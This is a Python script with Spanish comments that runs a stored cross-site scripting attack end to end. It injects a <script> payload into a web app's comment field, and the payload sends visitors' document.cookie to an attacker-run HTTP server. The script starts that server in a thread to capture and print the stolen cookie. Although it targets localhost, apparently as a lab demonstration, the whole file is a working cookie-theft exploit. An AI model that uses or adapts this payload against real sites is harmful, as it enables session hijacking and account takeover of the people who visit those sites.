#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import requests
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading

# Configuración
TARGET_URL = "http://localhost:5000/comments"  # Ruta de la aplicación vulnerable
ATTACKER_SERVER = "localhost"  # Dirección del servidor del atacante
ATTACKER_PORT = 8080  # Puerto del servidor del atacante

# Variable para almacenar la cookie robada
stolen_cookie = None

# Servidor HTTP para recibir la cookie robada
class CookieStealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_cookie
        # Extraer la cookie de la URL
        if "cookie" in self.path:
            stolen_cookie = self.path.split("cookie=")[1]
            print(f"[+] Cookie robada: {stolen_cookie}")
        self.send_response(200)
        self.end_headers()

# Función para iniciar el servidor del atacante
def start_attacker_server():
    server_address = (ATTACKER_SERVER, ATTACKER_PORT)
    httpd = HTTPServer(server_address, CookieStealerHandler)
    print(f"[*] Servidor del atacante iniciado en http://{ATTACKER_SERVER}:{ATTACKER_PORT}")
    httpd.serve_forever()

# Función para inyectar el script malicioso en la aplicación vulnerable
def inject_malicious_script():
    # Código malicioso que roba la cookie
    malicious_script = f"""
    <script>
        var cookie = document.cookie;
        console.log("Cookie capturada:", cookie);  // Debugging
        var img = new Image();
        img.src = "http://{ATTACKER_SERVER}:{ATTACKER_PORT}/steal?cookie=" + cookie;
    </script>
    """
    
    # Datos que se enviarán en la solicitud POST (simulando un formulario)
    payload = {
        'comment': malicious_script  # Campo vulnerable (por ejemplo, un comentario)
    }
    
    try:
        # Enviar la solicitud POST para inyectar el script (sin seguir redirecciones)
        response = requests.post(TARGET_URL, data=payload, allow_redirects=False)
        
        if response.status_code == 302:  # Código de estado para redirección
            print("[+] Script malicioso inyectado con éxito.")
        else:
            print(f"[-] Error al inyectar el script. Código de estado: {response.status_code}")
            print(f"[-] Respuesta del servidor: {response.text}")  # Imprime la respuesta del servidor para debug
    except requests.exceptions.RequestException as e:
        print(f"[-] Error de conexión: {e}")

if __name__ == '__main__':
    # Iniciar el servidor del atacante en un hilo separado
    attacker_thread = threading.Thread(target=start_attacker_server)
    attacker_thread.daemon = True
    attacker_thread.start()
    
    # Inyectar el script malicioso en la aplicación vulnerable
    inject_malicious_script()
    
    # Esperar a que la cookie sea robada
    print("[*] Esperando a que la víctima visite la página y la cookie sea robada...")
    while not stolen_cookie:
        pass